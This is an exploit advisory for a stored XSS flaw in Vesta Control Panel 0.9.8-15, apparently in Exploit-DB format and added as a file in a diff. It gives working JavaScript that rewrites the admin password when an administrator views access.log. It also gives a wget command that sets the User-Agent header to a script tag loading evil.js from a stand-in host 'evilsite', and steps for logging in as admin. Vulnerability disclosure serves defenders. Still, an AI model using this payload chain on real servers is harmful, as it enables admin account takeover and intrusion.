@@ -1,0 +1,42 @@
+﻿# Exploit Title     :Vesta Control Panel <= 0.9.8-15 - Persistent XSS Vulnerability
+# Vendor Homepage   :http://www.vestacp.com
+# Version           :0.9.8-15
+# Exploit Author    :Necmettin COSKUN @babayarisi 
+# Blog              :http://ha.cker.io
+# Discovery date    :16/02/2016
+# Tested on         :Fedora23 - Chrome/Firefox/Maxthon
+
+We can use user-agent information to attack website like this. 
+First of all we change our user-agent and add some dangerous javascript code ( XSS etc. ) 
+and then we request to one of the website on target server then it is saved on access.log by server 
+so when Administrator reads it the javascript code works that we added our user-agent information.
+
+Poc Exploit
+================
+1.Prepare evil js file 
+
+function csrfWithToken(url,hanimisToken,password){
+	$.get(url, function(gelen) {
+		$('body').append($(gelen));
+		$('form[id="vstobjects"]').css("display","none");
+		var token = $(hanimisToken).attr("token");
+		$('form[id="vstobjects"]').attr("action",url);
+		$('input[name="v_password"]').val(password);	
+		$('form[id="vstobjects"]').submit();		
+	});
+};
+//password = 1234567
+csrfWithToken("/edit/user/?user=admin","#token","123456");
+
+2. Make a Get request with evil user-agent to victim server
+ 
+wget --header="Accept: text/html" --user-agent="<script src='http://evilsite/evil.js'></script>" http://victimserver
+ 
+3. We wait Administrator to read access.log that injected our evil.js
+4. We log-in VestaCP via password we changed
+http(s)://victim:8083/
+  
+  
+Discovered by:
+================
+Necmettin COSKUN  |GrisapkaGuvenlikGrubu|4ewa2getha!
